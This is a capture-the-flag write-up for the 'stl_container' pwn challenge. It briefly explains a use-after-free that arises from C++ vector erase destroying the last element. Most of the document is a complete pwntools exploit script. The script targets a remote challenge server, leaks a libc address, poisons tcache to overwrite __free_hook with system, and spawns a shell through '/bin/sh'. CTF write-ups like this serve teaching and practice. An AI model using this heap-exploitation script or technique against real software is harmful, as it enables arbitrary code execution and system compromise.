### stl_container
[中文](./README_zh.md) [English](./README.md)
[attachment](./attachment.zip)

This challenge is about a bug in c ++ vector template
When the item stored in the vector is an Object, no matter what index you want to erase will call the destructor of the last Object in the vector
This causes a UAF vulnerability, and then you can use tcache to carry out various attacks

Below is the exp
```
from pwn import *

debug=0

#context.terminal = ['tmux','-x','sh','-c']
#context.terminal = ['tmux', 'splitw', '-h' ]
context.log_level='debug'

if debug:
    p=process('./stl_container')
    #p=process('',env={'LD_PRELOAD':'./libc.so'})
    gdb.attach(p)
else:
    p=remote('134.175.239.26',8848)

def ru(x):
    return p.recvuntil(x)

def se(x):
    p.send(x)

def sl(x):
    p.sendline(x)

def add(ty, content='a'):
    sl(str(ty))
    ru('3. show')
    ru('>>')
    sl('1')
    ru('input data:')
    se(content)
    ru('>>')

def delete(ty, idx=0):
    sl(str(ty))
    ru('3. show')
    ru('>>')
    sl('2')
    if ty <= 2:
        ru('index?')
        sl(str(idx))
    ru('>>')

def show(ty, idx=0):
    sl(str(ty))
    ru('3. show')
    ru('>>')
    sl('3')
    ru('index?\n')
    sl(str(idx))
    ru('data: ')
    data = ru('\n')
    ru('>>')
    return data


ru('>>')

add(1)
add(1)
add(2)
add(2)
add(4)
add(4)
add(3)
add(3)

delete(3)
delete(3)
delete(1)
delete(1)
delete(4)
delete(4)
delete(2)
data = show(2)
libc = u64(data[:6]+'\0\0')
base = libc - 0x3ebca0
free_hook = base + 0x3ed8e8
system = base + 0x4f440

add(3, '/bin/sh\0')
delete(2)
add(4)
add(2)
add(2)
add(3, '/bin/sh\0')
delete(2)
delete(2)
add(1, p64(free_hook))
add(1, p64(system))

sl('3')
ru('show')
sl('2')

print(hex(base))
p.interactive()

```
